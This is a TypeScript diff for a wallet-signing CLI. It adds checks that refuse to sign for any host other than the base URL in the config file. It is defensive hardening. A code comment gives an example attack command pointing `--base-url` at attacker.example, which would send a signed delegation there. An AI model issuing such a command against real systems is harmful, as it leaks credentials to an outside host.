@@ -23,6 +23,8 @@ import type {
 } from './config';
 import { parseUsdToAtomic } from './money';
 import { parseConfirmPolicy, type SpendPolicy } from './policy';
+import { isSameDeployment } from './production-origin';
+import { originOf, tryOriginOf } from './url';
 import type { CommandContext } from '../context';
 
 /**
@@ -63,6 +65,50 @@ export interface ResolvedSettings {
    * (uncapped opt-in), 0n = disabled, otherwise the atomic cap.
    */
   sendMaxAmountAtomic: bigint | null | typeof SEND_MAX_UNSET;
+}
+
+/**
+ * Is this origin the one deployment the CONFIG names?
+ *
+ * THE PIN IS THE FILE'S BASE URL, never the resolved one. `--base-url` and
+ * `TENJIN_BASE_URL` ride every leaf command, and an agent that names a host must
+ * not thereby move the pin: without this, one auto-allowed
+ * `tenjin search --base-url https://attacker.example "q"` would mint a fresh
+ * wallet-signed delegation FOR that host, send it there, and overwrite the
+ * machine's good session file on the way out. Every command that wallet-signs
+ * asks this first: `read` (`resolveResourceRef` has already pinned its URL),
+ * `search`, `org` and `shelf`.
+ *
+ * Deployment, not origin equality: `isSameDeployment` lets the production
+ * aliases stand in for each other exactly where `resource-ref` does, and for a
+ * self-hosted or preview base it is plain equality.
+ */
+export function onConfiguredDeployment(
+  origin: string,
+  settings: { configuredBaseUrl: string },
+): boolean {
+  const configured = tryOriginOf(settings.configuredBaseUrl);
+  return configured !== null && isSameDeployment(origin, configured);
+}
+
+/**
+ * The same pin for a command that has no public route to degrade to: `org` and
+ * `shelf` write and read a team's membership, so a base URL the config does not
+ * name is a refusal rather than a quieter answer.
+ */
+export function assertConfiguredDeployment(settings: {
+  baseUrl: string;
+  configuredBaseUrl: string;
+}): void {
+  const origin = originOf(settings.baseUrl);
+  if (onConfiguredDeployment(origin, settings)) return;
+  throw new CliError(
+    'REFUSED',
+    `${origin} is not the deployment this machine is configured for, so nothing will be signed for it.`,
+    {
+      fix: 'Drop --base-url (and TENJIN_BASE_URL), or point the config at that deployment with `tenjin config set baseUrl <url>`.',
+    },
+  );
 }
 
 export async function resolveContextSettings(ctx: CommandContext): Promise<ResolvedSettings> {
